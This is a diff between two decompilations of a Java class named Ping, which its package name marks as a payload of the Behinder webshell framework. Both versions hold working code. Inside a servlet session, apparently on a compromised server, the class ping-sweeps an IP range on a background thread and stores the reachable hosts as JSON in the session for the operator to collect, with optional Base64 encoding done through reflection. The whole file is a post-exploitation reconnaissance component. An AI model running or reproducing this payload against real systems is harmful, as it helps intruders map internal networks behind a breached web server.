@@ -1,119 +1,132 @@
-// 
-// Decompiled by Procyon v0.5.36
-// 
-
 package net.rebeyond.behinder.payload.java;
 
+import java.math.BigInteger;
+import java.net.InetAddress;
+import java.net.UnknownHostException;
+import java.util.HashMap;
 import java.util.Iterator;
 import java.util.Map;
-import java.util.HashMap;
-import java.math.BigInteger;
-import java.net.UnknownHostException;
-import java.net.InetAddress;
-import javax.servlet.ServletResponse;
 import javax.servlet.ServletRequest;
+import javax.servlet.ServletResponse;
 import javax.servlet.http.HttpSession;
 
-public class Ping implements Runnable
-{
-    public static String ipList;
-    public static String taskID;
-    private HttpSession Session;
-    
-    public Ping() {
-    }
-    
-    public Ping(final HttpSession session) {
-        this.Session = session;
-    }
-    
-    public void execute(final ServletRequest request, final ServletResponse response, final HttpSession session) throws Exception {
-        new Thread(new Ping(session)).start();
-    }
-    
-    private static int ip2int(final String ip) throws UnknownHostException {
-        int result = 0;
-        final InetAddress addr = InetAddress.getByName(ip);
-        for (final byte b : addr.getAddress()) {
-            result = (result << 8 | (b & 0xFF));
-        }
-        return result;
-    }
-    
-    private static String int2ip(final int value) throws UnknownHostException {
-        final byte[] bytes = BigInteger.valueOf(value).toByteArray();
-        final InetAddress address = InetAddress.getByAddress(bytes);
-        return address.getHostAddress();
-    }
-    
-    public static void main(final String[] args) {
-        final String start = Ping.ipList.split("-")[0];
-        final String stop = Ping.ipList.split("-")[1];
-        try {
-            final int startValue = ip2int(start);
-            final int stopValue = ip2int(stop);
-            for (int i = ip2int(start); i < ip2int(stop); ++i) {
-                final String ip = int2ip(i);
-                InetAddress.getByName(ip).isReachable(3000);
+public class Ping implements Runnable {
+   public static String ipList;
+   public static String taskID;
+   private HttpSession Session;
+
+   public Ping() {
+   }
+
+   public Ping(HttpSession session) {
+      this.Session = session;
+   }
+
+   public void execute(ServletRequest request, ServletResponse response, HttpSession session) throws Exception {
+      (new Thread(new Ping(session))).start();
+   }
+
+   private static int ip2int(String ip) throws UnknownHostException {
+      int result = 0;
+      InetAddress addr = InetAddress.getByName(ip);
+      byte[] var3 = addr.getAddress();
+      int var4 = var3.length;
+
+      for(int var5 = 0; var5 < var4; ++var5) {
+         byte b = var3[var5];
+         result = result << 8 | b & 255;
+      }
+
+      return result;
+   }
+
+   private static String int2ip(int value) throws UnknownHostException {
+      byte[] bytes = BigInteger.valueOf((long)value).toByteArray();
+      InetAddress address = InetAddress.getByAddress(bytes);
+      return address.getHostAddress();
+   }
+
+   public static void main(String[] args) {
+      String start = ipList.split("-")[0];
+      String stop = ipList.split("-")[1];
+
+      try {
+         int startValue = ip2int(start);
+         int stopValue = ip2int(stop);
+
+         for(int i = ip2int(start); i < ip2int(stop); ++i) {
+            String ip = int2ip(i);
+            boolean var7 = InetAddress.getByName(ip).isReachable(3000);
+         }
+      } catch (Exception var8) {
+      }
+
+   }
+
+   public void run() {
+      String start = ipList.split("-")[0];
+      String stop = ipList.split("-")[1];
+      Map sessionObj = new HashMap();
+      Map scanResult = new HashMap();
+      sessionObj.put("running", "true");
+
+      try {
+         int startValue = ip2int(start);
+         int stopValue = ip2int(stop);
+
+         for(int i = startValue; i <= stopValue; ++i) {
+            String ip = int2ip(i);
+            boolean isAlive = InetAddress.getByName(ip).isReachable(3000);
+            if (isAlive) {
+               scanResult.put(ip, "true");
+               sessionObj.put("result", this.buildJson(scanResult, false));
             }
-        }
-        catch (Exception ex) {}
-    }
-    
-    @Override
-    public void run() {
-        final String start = Ping.ipList.split("-")[0];
-        final String stop = Ping.ipList.split("-")[1];
-        final Map<String, String> sessionObj = new HashMap<String, String>();
-        final Map<String, String> scanResult = new HashMap<String, String>();
-        sessionObj.put("running", "true");
-        try {
-            final int startValue = ip2int(start);
-            for (int stopValue = ip2int(stop), i = startValue; i <= stopValue; ++i) {
-                final String ip = int2ip(i);
-                final boolean isAlive = InetAddress.getByName(ip).isReachable(3000);
-                if (isAlive) {
-                    scanResult.put(ip, "true");
-                    sessionObj.put("result", this.buildJson(scanResult, false));
-                }
-                this.Session.setAttribute(Ping.taskID, (Object)sessionObj);
+
+            this.Session.setAttribute(taskID, sessionObj);
+         }
+      } catch (Exception var10) {
+         sessionObj.put("result", var10.getMessage());
+      }
+
+      sessionObj.put("running", "false");
+   }
+
+   private String buildJson(Map entity, boolean encode) throws Exception {
+      StringBuilder sb = new StringBuilder();
+      String version = System.getProperty("java.version");
+      sb.append("{");
+      Iterator var5 = entity.keySet().iterator();
+
+      while(var5.hasNext()) {
+         String key = (String)var5.next();
+         sb.append("\"" + key + "\":\"");
+         String value = ((String)entity.get(key)).toString();
+         if (encode) {
+            Class Base64;
+            Object Encoder;
+            if (version.compareTo("1.9") >= 0) {
+               this.getClass();
+               Base64 = Class.forName("java.util.Base64");
+               Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
+               value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
+            } else {
+               this.getClass();
+               Base64 = Class.forName("sun.misc.BASE64Encoder");
+               Encoder = Base64.newInstance();
+               value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
+               value = value.replace("\n", "").replace("\r", "");
             }
-        }
-        catch (Exception e) {
-            sessionObj.put("result", e.getMessage());
-        }
-        sessionObj.put("running", "false");
-    }
-    
-    private String buildJson(final Map<String, String> entity, final boolean encode) throws Exception {
-        final StringBuilder sb = new StringBuilder();
-        final String version = System.getProperty("java.version");
-        sb.append("{");
-        for (final String key : entity.keySet()) {
-            sb.append("\"" + key + "\":\"");
-            String value = entity.get(key).toString();
-            if (encode) {
-                if (version.compareTo("1.9") >= 0) {
-                    this.getClass();
-                    final Class Base64 = Class.forName("java.util.Base64");
-                    final Object Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
-                    value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
-                }
-                else {
-                    this.getClass();
-                    final Class Base64 = Class.forName("sun.misc.BASE64Encoder");
-                    final Object Encoder = Base64.newInstance();
-                    value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
-                    value = value.replace("\n", "").replace("\r", "");
-                }
-            }
-            sb.append(value);
-            sb.append("\",");
-        }
-        if (sb.toString().endsWith(",")) {
-            sb.setLength(sb.length() - 1);
-        }
-        sb.append("}");
-        return sb.toString();
-    }
+         }
+
+         sb.append(value);
+         sb.append("\",");
+      }
+
+      if (sb.toString().endsWith(",")) {
+         sb.setLength(sb.length() - 1);
+      }
+
+      sb.append("}");
+      return sb.toString();
+   }
 }
